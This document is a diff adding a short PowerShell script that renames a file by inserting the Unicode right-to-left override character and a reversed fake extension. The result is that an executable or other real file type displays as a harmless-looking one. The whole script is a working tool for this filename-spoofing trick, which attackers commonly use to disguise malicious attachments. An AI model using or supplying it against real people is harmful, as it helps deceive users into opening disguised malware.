@@ -1,0 +1,15 @@
+﻿param
+(
+   [string] $real_extension,
+   [string] $fake_extension,
+   [string] $file_path
+)
+
+$rtlo_encoding = [char]0x202e
+$file_name_place_Holder = "REPLACE"
+$fake_extension_reverse = -join[regex]::Matches($fake_extension,".",'RightToLeft')
+
+$new_filename = (Split-Path (resolve-path $file_path)) + "\" + $file_name_place_Holder + $rtlo_encoding + $fake_extension_reverse + "." + $real_extension
+
+Rename-Item -Path $file_path -NewName $new_filename 
+
